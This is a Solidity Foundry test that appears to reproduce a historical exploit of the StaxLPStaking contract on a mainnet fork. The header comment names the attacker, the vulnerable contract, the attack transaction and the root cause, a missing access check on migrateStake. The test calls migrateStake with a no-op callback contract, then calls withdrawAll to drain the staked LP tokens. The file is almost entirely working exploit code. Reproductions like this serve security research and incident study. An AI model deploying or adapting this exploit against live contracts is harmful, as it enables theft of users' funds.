// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

/*
Attacker: 0x9c9fb3100a2a521985f0c47de3b4598dafd25b01

Attacker contract: 0x2df9c154fe24d081cfe568645fb4075d725431e0

Vulnerable contract: 0xd2869042e12a3506100af1d192b5b04d65137941

Attack tx: 0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5

Root cause: Insufficient access control to the migrateStake function.
*/

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external;
}

contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  IERC20 xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
  IStaxLPStaking StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);


  function setUp() public {
    cheat.createSelectFork("mainnet", 15725066); // fork mainnet at block 15725066
  }

  function testExploit() public {

    uint lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));  

    StaxLPStaking.migrateStake(address(this),lpbalance);
    
    console.log("Perform migrateStake");

    StaxLPStaking.withdrawAll(false);
    console.log("Perform withdrawAll");
    console.log("After exploiting, xFraxTempleLP balance:", xFraxTempleLP.balanceOf(address(this))/1e18);
  }

   function migrateWithdraw(address, uint256) public //callback
   {

   }
}
